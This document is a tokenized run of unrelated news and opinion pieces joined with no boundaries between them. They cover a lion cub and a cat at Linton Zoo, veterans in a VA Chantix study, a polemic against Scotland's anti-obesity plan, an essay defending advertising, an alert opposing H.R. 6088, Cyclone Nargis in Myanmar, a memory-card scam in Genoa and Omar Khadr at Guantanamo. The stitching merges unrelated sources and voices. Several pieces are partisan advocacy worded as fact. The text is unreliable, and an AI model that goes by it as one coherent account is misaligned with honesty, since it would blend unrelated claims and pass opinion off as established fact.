Zara the lion cub and Arnie the house cat make a purrfect couple
With whiskers entwined and their furry bodies snuggled close , Zara and Arnie make a purrfect couple .
Unfortunately , the best friends are set for a rude awakening .
Very soon Zara the lion cub will have to say goodbye to her male companion Arnie the ginger tom cat .
After six weeks together , Zara is set to leave the confines of her comfy home to start a new life in Africa .
But Arnie will not be going with her .
Cute cub Zara would have died if she had been left with young parents Safina and Zuri , who were struggling to cope with their newborn at Linton Zoo in Cambridgeshire .
Instead the little lioness joined the family of zoo director Kim Simmons and has become best buddies with their cat .
The happy couple : Zara the lion cub enjoys a lick from tom cat Arnie
Now Zara is set to make another transition - to the shores of Lake Victoria in Entebbe , Uganda , East Africa , where she will join the Ugandan Wildlife Education Centre ( UWEC ) .
Kim said : ' As long as she 's going to a good home with a good quality of life , I have to be happy .
' I 'll find it a struggle to part with her but I know she will never forget me . '
The UWEC rescues and rehabilitates animals and aims to promote the conservation of wildlife in Uganda and educate children .
Zoo director Kim Simmons gives Zara some milk .
The young cub is living at her home until she leaves for her new life at the Ugandan Wildlife Education Centre
Zara is doing well since being removed from her parents six weeks ago .
She has been transformed from a helpless 2lb 4 oz cub into a 10 lb bundle of mischief .
Kim said : ' We only hand - rear the cubs if it is absolutely necessary , but this was Safina 's first baby and she could n't feed her due to her young age and inexperience .
Cat nap : Zara and Arnie have a doze , making the most of their time together
' She lives in the house and is bottle - fed by us daily .
She 's got an absolutely wonderful personality and is very laid back and affectionate .
' Arnie the cat loves having cubs in the house and the two are great friends , but we 'll have to guard him as Zara gets bigger and stronger . '
Zara is one of five lions at family - run Linton Zoo which has been operating since 1972 .
The others are her grandparents Riziki and Karla and her parents .
Zara would have died if she had been left with her young parents , who were struggling to cope with their newborn cub .
But she has come on well after being hand reared by zoo director Kim Simmons
Safina and Zuri are expecting another litter of cubs in October and Kim thinks their brief experience with Zara wull help them cope better next time .
Zara 's progress is being followed by a Channel 5 film crew who are making a documentary to be screened later this year .
All lions born at Linton Zoo will be moved to Uganda as part of a joint project between West Midlands Safari Park and Paradise Wildlife Park in Hertfordshire .
June 17 , 2008  --
Mentally distressed veterans from Iraq and Afghanistan are being recruited for government tests on pharmaceutical drugs linked to suicide and other violent side effects , an investigation by ABC News and The Washington Times has found .
The report will air on Good Morning America and will also appear in The Washington Times on Tuesday .
( click here to read the Washington Times coverage of " Disposable Heroes " )
In one of the human experiments , involving the anti-smoking drug Chantix , Veterans Administration doctors waited more than three months before warning veterans about the possible serious side effects , including suicide and neuropsychiatric behavior .
" Lab rat , guinea pig , disposable hero , " said former US Army sniper James Elliott in describing how he felt he was betrayed by the Veterans Administration .
Elliott , 38 , of suburban Washington , D.C. , was recruited , at $ 30 a month , for the Chantix anti-smoking study three years after being diagnosed with Post Traumatic Stress Disorder .
He served a 15 - month tour of duty in Iraq from 2003 - 2004 .
Months after he began taking the drug , Elliott suffered a mental breakdown , experiencing a relapse of Iraq combat nightmares he blames on Chantix .
" They never told me that I was going to be suicidal , that I would cease sleeping .
They never told me anything except this will help me quit smoking , " Elliott told ABC News and The Washington Times .
On the night of February 5th , after consuming a few beers , Elliott says he " snapped " and left his home with a loaded gun .
His fiancee , Tammy , called police and warned , " He 's extremely unstable .
He has PTSD . "
" Do you think that he is going to shoot or attack the police ? " the 911 dispatcher asked .
" I can't be certain .
I do n't know , " she said .
( click here to hear part of Tammy 's 911 call )
" He was operating as if he was back in theater , in combat theater , " she told ABC News .
" And of course , a soldier goes nowhere without a gun . "
When police arrived , they found Elliott in the street , with the gun in the front pocket of his hooded sweatshirt .
" Are you going to shoot me ?
Shoot me , " Elliott said , according to the police report .
( click here to see the police report )
Police used a Taser gun to stun Elliott and placed him under arrest .
It was n't until three weeks later that the Veterans Administration advised the veterans in the Chantix study that the drug may cause serious side effects , including " anxiety , nervousness , tension , depression , thoughts of suicide , and attempted and completed suicide . "
The VA 's letter to the veterans , on February 29 , 2008 , followed three warnings from the FDA and Chantix ' maker Pfizer , that were issued on November 20 , 2007 , January 18 , 2008 and February 1 , 2008 .
( click here to read the FDA warning and click here to read Pfizer 's statement on Chantix )
" How this study continued in the face of these difficulties is almost impossible to understand , " said Arthur Caplan , director of the Center for Bioethics at the University of Pennsylvania .
Doctors at the Veterans Administration say they acted as quickly as they could .
" This did n't justify an emergency warning at that level , " said Dr. Miles McFall , co-administrator of the VA study .
Dr. McFall said there is no proof that Elliott 's breakdown was caused by Chantix and he sees no reason to discontinue the study .
Some 140 veterans diagnosed with Post Traumatic Stress Disorder continue to receive Chantix as part of a smoking cessation study .
Dr. McFall says the VA decided to continue the Chantix study because " it would be depriving our veterans of an effective method of treatment to help them stop smoking . "
Caplan , one of the country 's leading medical ethicists , said he was stunned by the VA 's decision to continue the Chantix experiment .
" Why take the group most a risk and keep them going ?
That does n't make any sense , once you know the risk is there , " he said .
Chantix is one of the drugs being used in an estimated 25 clinical studies using veterans by the VA .
Pfizer maintains that " the benefits of Chantix outweigh the risks " and that it continues to do further studies on the drug .
The FAA has prohibited commercial airline pilots from using Chantix because of its possible side effects .
It ’s happened .
What you eat , cook and feed your children in your own home is now a government matter .
Pregnant women and mothers of children under 5 will be getting a knock on the door from a government “ health visitor ” and given “ advice on healthier eating . ”
Not only that , employers are being encouraged to monitor workers ’ weights .
Businesses are being provided with government software that workers will have to type in their weight every morning , which will go into a weight surveillance database .
Those who gain weight will be flagged for intervention .*
It ’s part of the Scottish government ’s new $ 110 million anti-obesity strategy launched by public health minister Shona Robison .
As the Scotsman also reported in today ’s full story :
Ministers also want to change the way cooking is taught in the nation 's catering colleges by getting young chefs to rely less on salt , sugar , butter and cream , and more on healthy alternatives ...
Additional measures include spending £ 19 m of the total programme on vouchers for fruit and vegetables for women of childbearing age , pregnant women , and children under five in disadvantaged areas , and a review of commercial sponsorship rules to crack down on advertising and promotion of junk food .
Ministers will order a retraining programme for midwives and health visitors to ensure that they can give the most up - to - date advice to pregnant women and mothers .
In addition , the SNP will launch a " cooking bus " , which will tour Scotland giving advice on healthy eating .
Robison said : " Obesity is one of the problems that , like climate change , does not have a simple solution and requires a new way of thinking .
If we successfully tackle obesity then we will reduce ill - health , and a healthier Scotland is vital for sustaining and growing our economy . " ...
The announcement of the decision of NHS Health Scotland to go forward with its anti-obesity Diet Action Plan came at the same time the World Health Organization issued its report finding , not a crisis of ill health , but that Scottish youngsters are healthier and leading healthier lifestyles than kids in most of the entire rest of the world !
They ’re eating the most fruits and vegetables , too .
Scotland ’s public health official ’s decision may have come as a surprise , since not only do its own statistics also show there ’s been no notable increase in “ overweight ” Scottish kids for nearly 15 years now , but it had just spent a gob of money on a massive study of its own strategies and they 'd proven a total failure !
The WHO Health Behaviour in School - Aged Children study
The new international report from the Health Behaviour in School - Aged Children , WHO Collaborative Cross - National Study : Inequalities in young People ’s Health , was just released .
This is the most comprehensive cross-national analysis on health - related behaviors and health of young people in 41 developed countries and regions across Europe and North America .
It is the fourth in the series of international reports meant to provide statistics to guide public health policies in developed countries .
Researchers had surveyed more than 200,000 young people , ages 11 - 15 , in a representative sampling of school children from each country in 2005 - 6 .
The 208 - page report found that Scottish children ranked second in the world for ‘ healthy eating ’ habits and sixth for the amount of vigorous and sustained exercise they did .
Some of the reports findings on how Scottish children fared were summarized in the Herald News :
Scots children ‘ among world ’s healthiest ’
Scots children are eating more fruit and leading healthier and happier lifestyles than many other young people around the world , a major health survey has revealed ...
Researchers found that 11 - year - olds in Scotland ranked second in the world for their fruit consumption with 55 % of girls aged 11 eating fruit on a daily basis , just 1 % behind the Portuguese and compared to 50 % in England .
However , the ‘ healthy ’ diet becomes less popular through adolescence in Scotland , with 40 % of 13 - year - old girls taking fruit on a daily basis and 34 % of 15 - year - old girls .
Scots were placed sixth in the international league for [ moderate vigorous ] physical exercise , with 40 % of 11 - year - old girls and 25 % of boys taking part in at least one hour of activity a day .
The percentage of 15 - year olds in Scotland with weights and heights that put their BMIs in the “ overweight ” or “ obese ” category , according to new WHO BMI charts , was 12 % ( girls ) and 14 % ( boys ) .
As controversial as the efficacy of those definitions are , however , they still proved irrelevant to the growing children because four times that number of girls thought they were “ too fat . ”
Nearly half ( 48 % ) of 15 - year old girls thought they were too fat , and 25 % of boys .
The report found further evidence of the harm of international focus on obesity and “ healthy eating , ” in high rates of young people dieting trying to lose weight , most notably girls .
As the report authors noted , this behavior “ has potentially serious consequences for young people ’s development ” and listed problems with learning , sleep , depression and anxiety , menstruation and delayed sexual maturation and nutritional deficiencies , as well as eating disorders and suicidal ideation .
Among the 15 - year old girls in Scotland , 27 % were engaging in risky dieting behaviors ( 8 % of boys ) .
[ Among U.S. girls 11 - 15 years of age , the rate of dieting was 25 % , among the highest in the world . ]
The report found that dieting and efforts to lose weight increased with age in all developed countries , unrelated to family affluence .
The government ’s own statistics
Popular beliefs of an epidemic of childhood obesity among Scottish children proved to be a myth when the government ’s own statistics , the National Study of Health and Growth study , were analyzed by public health researchers at UMDS , St. Thomas ’ Campus in London .
[ See here for the full report and important illustrations . ]
Bottom line , since the 1970s , children have become healthier and better nourished — and grown taller — with weights in direct proportion to their heights .
There is no epidemic of gargantuan children , as seen on TV .
When growth of children is couched in terms of BMI , it is easy to forget this includes their height and is not just a measure of their weight .
( Body mass index = weight in kilograms to the square of height in meters . )
Similarly , the Social Issues Research Centre in Oxford , UK , analyzed the Health Survey for England data and found that in the past decade , there had been little change in childhood obesity rates .
Hungry for Success
The greatest disconnect in this past week ’s launch of NHS Health Scotland ’s new anti-obesity action plan is that it had recently released the results of its pilot program conducted since 1999 and found that , while the program was a “ success ” in meeting its goals , it did n’t work .
[ See here for the full report . ]
To summarize , the blueprint for the Scottish government ’s diet action plan encompassed every facet of society , including 71 actions across nine sectors .
This massive initiative included every popular healthy eating idea that ’s probably ever been proposed : nutritional advice was given to every household in Scotland ; public health education campaigns ensued , cooking shows and resources were devoted to ‘ healthy ’ eating ; expectant mothers were intensely targeted for education to breastfeed and improve infant and children ’s diets ; sustainable agriculture was employed ” to get more local produce eaten by local people ; ” farm shops and farmers markets grew ; food labeling was expanded to increase proper choices ; food producers reduced sugars , fats and salts in food products to comply with new healthier nutrient standards ; dairy fats were discouraged and fish oils encouraged ; supermarkets were employed to bring healthy food to low - income communities ; livestock was bred to be leaner , and even sugar was to be removed from children ’s medicines .
Its “ target of greatest importance ” was to increase consumption of fruits and vegetables and complex carbohydrates .
Hungry for Success , geared towards school children , had “ enormous public and political support ” and was well - funded , with $ 126.09 million ( US dollars ) for its first three years alone .
Healthy eating and efforts to “ raise dietary awareness in schools ” was made the focus , even in school health curriculums .
All staff involved in health education were provided special training in nutrition and diet .
Nutrition standards and diet policies were established for school meals and were monitored .
According to the HMIE inspectors ' report published by NHS Health Scotland , the Hungry for Success program succeeded well beyond the original recommendations .
But , its first target goal — increasing fruit and vegetable consumption in kids — proved a failure .
Despite years of nonstop messaging and even giving children free fruit in school , the report found “ no evidence as yet that it directly impacts the total fruit consumption of primary school children . ”
It also failed to have any impact in achieving its primary goal : reducing rates of “ overweight and obesity ” in children .
[ Those are precisely the results found in the United States , when the CDC ’s 2 - year study of our government ’s comprehensive initiatives to promote healthy eating and physical activity were released in April .
The School Nutrition Policy Initiative had also invested millions of dollars and included every proposal popularly believed needed to change diet and lifestyle behaviors and reduce childhood obesity .
After 2 years , there was no change in the prevalence of obesity among the children , nor improvement in “ healthy eating ” and the number of fruits and vegetables the children were eating . ]
So , the Scottish government ’s own evidence has shown that a massively expensive and intrusive program to address a nonexistent health crisis does n’t work .
In fact , the available evidence is suggesting it is putting children ’s health and well - being at risk .
But it gets worse .
Low - income assistance
As the Sunday Mail had pointed out , mums - to - be and children in low income homes are being targeted for the advice on how to eat healthier and to be given vouchers for fruits and vegetables .
This is an important distinction that is rarely spoken .
As uncomfortable as it may be to admit , initiatives promoting fruits and vegetables are n’t about healthy eating .
They are not about helping poor women feed their children and unborn babies with the full range of foods necessary for good nutrition and health .
They are a response to classism and prejudices that believe lower - income parents do n’t know how to properly feed their children and are eating mostly junk .
If they ate “ right ” — i.e. more fresh fruits and vegetables — they would be healthier ( and thinner ) , so the thinking goes .
Even being fat does n’t make one immune to holding these prejudices .
The belief of low - income people eating poor diets is certainly portrayed in the images “ as seen on TV , ” but that does n’t make it real .
A $ 6 French wheat baguette baked in an artisan brick oven is better “ quality ” than a $ 2 loaf of white sandwich bread from the day - old bakery , but nutritionally , they ’re little different .
That kobe beef burger with pomme frites at $ 175 may be “ better ” than a $ 2 fast food burger and fries , but they differ only in pedigree , not nutrition .
A family can eat just as nutritionally spending $ 200 on private - label organic products from Whole Foods as $ 50 on store brand , commercial products at the corner Piggly Wiggly .
Eating one ' right ' way does n't make someone a better person .
Our first question is how “ quality ” is defined .
And do low - fat products ; reduced sugar and salt foods ; high fiber ; and fresh produce mean a diet is automatically nutritionally healthier ?
Besides the fact that the body of evidence consistently shows that fat and thin children eat no differently to explain the diversities of their sizes , income does n’t explain the diversities of their nutritional status , either .
Population dietary studies published for well over 50 years have shown low income children and families in developed countries do n’t eat appreciably different , nutritionally , from higher income families .
Yet , this unintuitive phenomenon continues to be restudied again and again .
Two more studies examining social - economic class and diet quality were recently published , but did n’t receive much media notice .
Because they can help us question our own biases and things we think we “ know ” to be true — beliefs that can affect how we look and treat others — that makes them important to hear about .
Review of social class and diet
The first paper was a review of 196 published epidemiological studies examining diet quality and socioeconomic status in industrialized societies , published in the American Journal of Clinical Nutrition .
A glance at the abstract might lead us to think it had found that the poor eat poorly : “ A large body of epidemiologic data show that diet quality follows a socioeconomic [ SES ] gradient . ”
But , there ’s that word “ quality , ” again .
The authors found that among the body of research , “ although micronutrient intake and , hence , diet quality are affected by SES , little evidence indicates that SES affects either total energy intakes or the macronutrient composition of the diet . ”
Critically reading the findings reveals that our beliefs are n’t the slam dunk we think they are .
The association found between SES and energy [ calorie ] intakes or the macronutrient composition of the diet intakes was either not statistically significant or inconsistent ... the associations observed between SES and protein consumption were positive , negative , or not significant .
No consistent SES gradient was obtained for carbohydrate intakes ...
No consistent SES gradient was observed for total fat intakes ...
The data on total energy intakes by SES were equally inconsistent ...
There was no SES difference in milk consumption , but higher income brackets ate more [ fat - laden ] cheese .
Nor was SES related to sweets consumption ( higher SES groups ate more candy and pastries , lower SES groups ate more sugar and cake ) .
The types of proteins consumed have also differed in some studies , but with little overall clinical meaning ( for instance , lean meats and seafood were associated with higher SES in some studies , but more stews and canned fish with lower SES groups ) .
In most of the studies reporting higher energy intake among lower SES , they noted , it was mostly among men , likely reflective of higher rates of physical labor .
Studies of plasma biomarkers for micronutrient vitamin and mineral status showing lower levels associated with low SES must be viewed with caution , they said : “ [ I ]t must be noted that these studies have typically focused on nutritionally at - risk groups , namely , elderly persons and pregnant and breastfeeding women . ”
Looking at fruits and vegetables , among the studies cited was an Australian dietary survey that found higher socioeconomic groups were more likely to eat more varieties of fruits and vegetables , but a closer look reveals that among the teens in this study , there was actually no difference in fruits and vegetables based on income bracket .
The lowest bracket teens , for example , ate more fruit and vegetables than most of their peers in the higher brackets .
Among adults , the variety of produce consumed differed among income brackets by a mere 0.2 to 0.3 fruits and vegetables .
As the review noted , a meta - analysis of studies from seven European countries found that the actual differences in consumption of produce between the highest and lowest economic groups was not clinically meaningful .
Fruits differed by about 24 - 34 grams a day , and vegetables by about 17 grams — a tablespoon .
But in other “ European countries , lower SES groups consumed more vegetables and fruit , as reported in food budget surveys in Greece , Spain , and Portugal and in the Eastern European countries Poland and Hungary . ”
The authors also said that the evidence does n’t support the correctness of reports saying that lower SES groups lack nutrition knowledge , cooking skills or motivation .
A number of studies , from all over the world , have shown little association with SES “ and that lower income groups are more likely to cook than are higher income groups ... where the middle and upper classes cook less and consume more convenience and ready - to - eat foods . ”
Cooking is n’t necessarily about nutritional knowledge , but also time constraints for shopping and cooking .
The authors also cautioned against attributing better health seen in higher socioeconomic populations to their diet quality , rather than the other factors associated with poverty versus wealth .
“ Nutrition research should not lose touch with reality , ” they concluded .
“ Current strategies for health promotions , based on recommending high - cost foods to low - income people , may prove to be wholly ineffective . ”
So , this review illustrated that social class does n’t predict someone ’s nutrition .
Low Income Diet and Nutrition Survey
This next study is particularly relevant to the government ’s new healthy eating , anti-obesity initiative targeting poorer women and children .
It was published by Britain 's Food Standards Agency and was led by the Health Research Group at the National Centre for Social Research .
The Low Income Diet and Nutrition Survey ( LIDNS ) specifically compared the dietary habits and nutritional status of low income families as compared to the general population across the UK , monitored by the National Diet and Nutrition Survey ( NDNS ) programme .
Before we get into the details of its findings , do you even remember the news coverage ?
It was n’t very widely covered , but the Sunday Times concisely reported the results :
Poor eat as healthily as rich
It seems to make no difference whether you prefer pasta al dente to a chip sandwich , or guacamole to mushy peas .
One of the biggest studies into eating habits of the poorest families in the UK has gone against conventional wisdom by finding their nutritional intake is similar to the rest of the country .
Food experts have argued for years that the poorest families suffer from " food poverty " , meaning they consume less nourishing food than the better - off and are at greater risk of long - term health problems .
But the [ $ 11.7 million ] study by Britain 's Food Standards Agency ( FSA ) , which looked at the eating habits of 3500 people , found the nutritional value of the food eaten by the poorest 15 per cent in society was little different from the average .
The study also found the rate of obesity , which has often been linked to poverty , was at a similar level among the poor as it is in the general population ... the research found no direct links between a poor diet and income , nor access to shops , nor cooking skills .
" The gap between the diets of people on low incomes and those of the rest of the population is not as big as some feared , " ...
This was a nationally representative sampling of 3,728 of the most materially deprived households in the UK and is the most comprehensive survey of its kind .
It included in - person interviews ; four 24 - hour dietary recalls on random days with one weekend ; physical measurements taken by nurses ; fasting blood collected to measure nutritional status ; and extensive information on shopping habits , food storage and cooking facilities , food prep and cooking skills , access to food at school and free , eating habits , dietary supplements , medical and dental health , prescriptions , weight changes , drinking , smoking , physical activity , education , income , attitudes and barriers to health heating and food security .
The report found diets change as people grew older .
Kids grow up , and their tastes and dietary habits naturally change , as has always been the case .
For example , wholegrains and fruit consumption increase with age ; while pizza , burgers and fries decrease .
But , between social - economic groups , while the food choices varied , the overall macro and micro nutrients were quite similar .
[ Click on images to enlarge . ]
For example , the percentages of calories consumed as carbohydrates , total fats and saturated fats were little different .
And , despite popular beliefs , the low income children at every age group were consuming total calories at or below estimated requirements for their age , size and activity levels .
And both the dietary assessments and blood analyses found adequate micronutrient status , with little difference between the groups :
Mean daily intakes of most vitamins and many minerals were above or close to the RNI [ Reference Nutrient Intake , amount sufficient to meet the needs of about 97 % of the population ] in the different sex and age groups in both LIDNS and NDNS .
For those where mean intakes fell below the RNI in specific age groups , this was usually the case for the same groups in both surveys .
For example , young women in both surveys ( all income levels ) had low daily intakes of iron , as in meat .
Average ( mean and median ) daily intakes of all vitamins from food sources , with the exception of vitamins A and D , were above or close to the RNI for males and females in all age groups .
There was a wide distribution of vitamin A intakes ; younger adults tended to have lower intakes compared with those aged 50 years and over ...
The main sources of vitamin A were vegetables , milk and milk products , fat spreads and meat and meat products .
There was evidence of low intakes of riboflavin , particularly among older children aged 11 - 18 years , men aged 19 - 34 years and women aged 19 - 49 years .
The main source of riboflavin , particularly amongst children , was milk and milk products .
The poorest families in the population did differ from the general population in a notable way : they suffered more food insecurity and difficulties finding enough to eat :
Just under two - fifths ( 39 % ) of the low income population reported that , in the last year , they had been worried that their food would run out before they got money for more , while a similar proportion ( 36 % ) indicated that they could not afford to eat balanced meals .
Overall , 22 % reported reducing or skipping meals , and 5 % reported not eating for a whole day , because they did not have enough money to buy food .
Parents ’ love for their children was also evidenced in this report , as parents everywhere sacrifice their diets to ensure their children are fed .
So , if we are most concerned about helping low - income families eat nutritionally , they need enough food .
And the report found that the extra nutrients to address deficiencies in daily recommended intakes are best supplied by meat , fats and dairy products .
Fruit and vegetable vouchers are n’t the best ways to help meet their most pressing nutritional needs for health .
But these ‘ healthy eating ’ initiatives are n’t really about health , are they ?
Reality check
So if the Scottish government is n’t following its own evidence which shows there is no crisis among its children with their health , weights or eating habits , and that their huge public health Diet Action Plan is ineffective — while diverting already limited public healthcare resources that could be being spent on healthcare — what guidelines are they going by in setting public health policies ?
Maybe the Englishman called it right .

The Market
The consumer is not omniscient .
He does not know where he can obtain at the cheapest price what he is looking for .
Very often he does not even know what kind of commodity or service is suitable to remove most efficaciously the particular uneasiness he wants to remove .
At best he is familiar with the market conditions of the immediate past and arranges his plans on the basis of this information .
To convey to him information about the actual state of the market is the task of business propaganda .
Business propaganda must be obtrusive and blatant .
It is its aim to attract the attention of slow people , to rouse latent wishes , to entice men to substitute innovation for inert clinging to traditional routine .
In order to succeed , advertising must be adjusted to the mentality of the people courted .
It must suit their tastes and speak their idiom .
Advertising is shrill , noisy , coarse , puffing , because the public does not react to dignified allusions .
It is the bad taste of the public that forces the advertisers to display bad taste in their publicity campaigns .
The art of advertising has evolved into a branch of applied psychology , a sister discipline of pedagogy .
Like all things designed to suit the taste of the masses , advertising is repellent to people of delicate feeling .
This abhorrence influences the appraisal of business propaganda .
Advertising and all other methods of business propaganda are condemned as one of the most outrageous outgrowths of unlimited competition .
It should be forbidden .
The consumers should be instructed by impartial experts ; the public schools , the " nonpartisan " press , and cooperatives should perform this task .
The restriction of the right of businessmen to advertise their products would restrict the freedom of the consumers to spend their income according to their own wants and desires .
It would make it impossible for them to learn as much as they can and want about the state of the market and the conditions which they may consider as relevant in choosing what to buy and what not to buy .
They would no longer be in a position to decide on the basis of the opinion which they themselves have formed about the seller 's appraisal of his products ; they would be forced to act on the recommendation of other people .
It is not unlikely that these mentors would save them some mistakes .
But the individual consumers would be under the tutelage of guardians .
If advertising is not restricted , the consumers are by and large in the position of a jury which learns about the case by hearing the witnesses and examining directly all other means of [ p. 321 ] evidence .
If advertising is restricted , they are in the position of a jury to whom an officer reports about the result of his own examination of evidence .
It is a widespread fallacy that skillful advertising can talk the consumers into buying everything that the advertiser wants them to buy .
The consumer is , according to this legend , simply defenseless against " high - pressure " advertising .
If this were true , success or failure in business would on the mode of advertising only .
However , nobody believes that any kind of advertising would have succeeded in making the candlemakers hold the field against the electric bulb , the horsedrivers against the motorcars , the goose quill against the steel pen and later against the fountain pen .
But whoever admits this implies that the quality of the commodity advertised is instrumental in bringing about the success of an advertising campaign .
Then there is no reason to maintain that advertising is a method of cheating the gullible public .
It is certainly possible for an advertiser to induce a man to try an article which he would not have bought if he had known its qualities beforehand .
But as long as advertising is free to all competing firms , the article which is better from the point of view of the consumers ' appetites will finally outstrip the less appropriate article , whatever methods of advertising may be applied .
The tricks and artifices of advertising are available to the seller of the better product no less than to the seller of the poorer product .
But only the former enjoys the advantage derived from the better quality of his product .
The effects of advertising of commodities are determined by the fact as a rule the buyer is in a position to form a correct opinion about the usefulness of an article bought .
The housewife who has tried a particular brand of soap or canned food learns from experience whether it is good for her to buy and consume that product in the future too .
Therefore advertising pays the advertiser only if the examination of the first sample bought does not result in the consumer 's refusal to buy more of it .
It is agreed among businessmen that it does not pay to advertise products other than good ones .
Entirely different are conditions in those fields in which experience cannot teach us anything .
The statements of religious , metaphysical , and political propaganda can be neither verified nor falsified by experience .
With regard to the life beyond and the absolute , any experience is always the experience of complex phenomena which is open to different interpretations ; the only yardstick which can be applied to political doctrines is aprioristic reasoning .
Thus political [ p. 322 ] propaganda and business propaganda are essentially different things , although they often resort to the same technical methods .
There are many evils for which contemporary technology and therapeutics have no remedy .
There are incurable diseases and there are irreparable personal defects .
It is a sad fact that some people try to exploit their fellow men's plight by offering them patent medicines .
Such quackeries do not make old people young and ugly girls pretty .
They only raise hopes .
It would not impair the operation of the market if the authorities were to prevent such advertising , the truth of which cannot be evidenced by the methods of the experimental natural sciences .
But whoever is ready to grant to the government this power would be inconsistent if he objected to the demand to submit the statements of churches and sects to the same examination .
Freedom is indivisible .
As soon as one starts to restrict it , one enters upon a decline on which it is difficult to stop .
If one assigns to the government the task of making truth prevail in the advertising of perfumes and tooth paste , one cannot contest it the right to look after truth in the more important matters of religion , philosophy , and social ideology .
The idea that business propaganda can force the consumers to submit to the will of the advertisers is spurious .
Advertising can never succeed in supplanting better or cheaper goods by poorer goods .
The costs incurred by advertising are , from the point of view of the advertiser , a part of the total bill of production costs .
A businessman expends money for advertising if and as far as he expects that the increase in sales resulting will increase the total net proceeds .
In this regard there is no difference between the costs of advertising and all other costs of production .
An attempt has been made to distinguish between production costs and sales costs .
An increase in production costs , it has been said , increases supply , while an increase in sales costs ( advertising costs included ) increases demand .
This is a mistake .
All costs of production are expended with the intention of increasing demand .
If the manufacturer of candy employs a better raw material , he aims at an increase in demand in the same way as he does in making the wrappings more attractive and his stores more inviting and in spending more for advertisements .
In increasing production costs per unit of the product the idea is always to increase demand .
If a businessman wants to increase supply , he must increase the total cost of production , which often results in lowering production costs per unit . [ p. 323 ]
RADAR ALERT :
Congressman Scott , Combat the Fatherhood Crisis : Oppose H.R. 6088 Senator Barak Obama gave a speech on the importance of fatherhood the same week that the National Fatherhood Initiative released a report , " The One Hundred Billion Dollar Man , " on the taxpayer costs of absent fathers .
The good news is that more and more policy makers and organizations are starting to understand the impact of absent fathers .
The bad news is policy makers do not really understand the causes of the fatherhood crisis .
As one of the few mainstream journalists who understand the government 's role in creating the fatherhood crisis , Kathleen Parker , pointed out in " Obama 's Incomplete Plea on Fatherhood , " Obama failed to mention that " the problem of absent fathers , especially in the black community , is tied in part to well - intentioned social programs such as ... domestic violence prevention . "
Since " the state 's punitive powers , permitted without due process , are mind - boggling to consider " and not every allegation of domestic violence is legitimate , " [ o ] nce the system is engaged and injunctions issued , even innocent fathers are unlikely to see much of their children .
Perhaps never . "
A prime example of policy maker 's failure to grasp root causes is H.R.6088 , which gives $ 55.5 million to prosecute alleged perpetrators of domestic violence .
The key word here is alleged .
The bill acts as if false accusations and overzealous prosecution do not exist .
It is hard to find another area where the federal government tips the scales of justice so much .
Because so many of the victims of this federally funded railroading will be African American fathers , it is difficult to understand why the Congressional Black Caucus is not unanimously opposed to it .
Amazingly , two members of the Black Caucus , Congressman Conyers and Congressman Sheila Jackson - Lee , are the sponsor and co-sponsor of H.R 6088 .
Fortunately not all members of the Black Caucus have signed on to H.R 6088 .
One key member is Congressman Robert " Bobby " Scott ( D Va. ) .
Congressman Scott is chairman of the Crime Sub -Committee of the House Judicial Committee .
To pass , H.R. 6088 must go through his sub-committee .
Please contact Congressman Scott and ask him to do his part to alleviate the fatherhood crisis by opposing H.R. 6088 .

HLAING THA YAR , Myanmar , May 6 ( Reuters ) -
When the full force of Cyclone Nargis passed overhead , people in this one village in southwest Myanmar could do little but sit tight and pray their lightweight bamboo shacks stood up to the ferocious winds .
For the most part , they did .
Elsewhere , deep in the vast marshlands of the Irrawaddy delta , people were less fortunate as winds of 190 km ( 120 miles ) per hour caused a sea surge that swept inland , killing most of the cyclone 's 15,000 victims , according to the military government .
" No one died around here .
We were very lucky , " said one 18 - year - old student in Hlaing Tha Yar , a village of about 10,000 people an hour 's drive west of Yangon .
He did not want to be named .
In the village , roofs had been ripped off about one in ten of the houses , simple bamboo structures with roofs made of leaves and walls of rush matting .
But in most cases , they simply shook violently and bent before the force of the blast , before springing back up when the storm passed , residents said .
Further south , CNN showed footage of one village in which it said every house had been virtually destroyed .
The relative absence of destruction in villages such as Hlaing Tha Yar is making it all the more difficult for the government and aid officials to work out how many people have been affected , and who is in biggest need of help .
United Nations aid officials can say only that the number of homeless is in range of several hundred thousand .
However , even in Hlaing Tha Yar , two km from the banks of the Yangon River , there is already a shortage of clean drinking water only three days after the cyclone .
Food prices have also shot up .
" There 's not much food , " said one woman standing by a stall of pineapples .
" The price of a cabbage is now 1,000 kyats , instead of 250 . "
With no sign of help from the military government , people are having to fall back on their own strength and ingenuity to patch up their homes and lives .
Saffron - robed Buddhist monks were sawing fallen trees beside the village 's dirt tracks , still strewn with branches but already baked dry again by the searing heat of the tropical southeast Asian sun .
The beams of roofless houses became impromptu drying racks for clothes as men balanced on bamboo poles lashing roofs back together .
" I was very scared , but luckily my roof was strong , " said one 21 - yr - old English teacher sawing up a tree trunk lying across his roof .
" It will take me 3 days to repair my house . "
On the outskirts of Yangon , the former Burma 's biggest city with a population of five million , the destruction appeared more severe , with huge trees uprooted and electricity pylons lay poleaxed beside the road .
With fuel supplies also running short , cars and buses waited in lines several kilometres long to fill up with compressed natural gas .

Petty thieves are exploiting the war on photography in Genoa :
As they were walking around , Jeff saw some interesting looking produce and pulled out his Canon G - 9 Point - and - Shoot and took a few pictures .
Within a few minutes a man came up dressed in plain clothes , flashed a badge , and told him he could n’t take photos in the store .
My brother said “ no problem ” ( after all , it ’s a private store , right ? ) , but then the guy demanded my brother ’s memory card .
My brother gave him that “ Are you outta your mind ” look and said , “ No way ! ”
Can you guess what happened next ?
The guy simply shrugged his shoulders and walked away .
My brother saw him in the store a little later , and the guy had a bag and was shopping .
My brother made eye contact with him , and the guy turned away as though he did n’t want Jeff looking at him .
Jeff feels like this was n’t “ official store security , ” but instead some guy collecting ( and then reselling ) memory cards from unsuspecting tourists ( many of whom might have just surrendered that card immediately ) .
Secret documents on Gitmo's youngest detainee revealed Diane Sweet
Published : Saturday July 12 , 2008
Print This Email This Secret documents were unsealed this week showing for the first time the extent of Canada 's federal government 's knowledge of the treatment of Omar Khadr inside of Guantanamo Bay prison camp .
Khadr is Canada 's only prisoner detained by the United States at Guantanamo Bay .
At age 17 , Khadr was placed in a special program at the camp that intentionally deprived him of sleep , and moved him every 3 hours for 21 days in order to prepare him to speak to government officials .
It is reported that the document release is just ahead of a release of video tapes of the interviews with those government officials that will give the first look at a detainee being questioned at the prison .
From the Canadian news The Globe and Mail : " On a number of occasions , the teenager was observed crying uncontrollably , and claiming he was at least partly blind .
He removed his shirt to show interviewers bullet wounds , one of them still seeping blood , that he had suffered to his back and stomach during a battle in Afghanistan .
The documents show that : Mr. Khadr was subjected to what was known as a " frequent flyer program , " which moves a prisoner from cell to cell every three hours 24 hours a day .
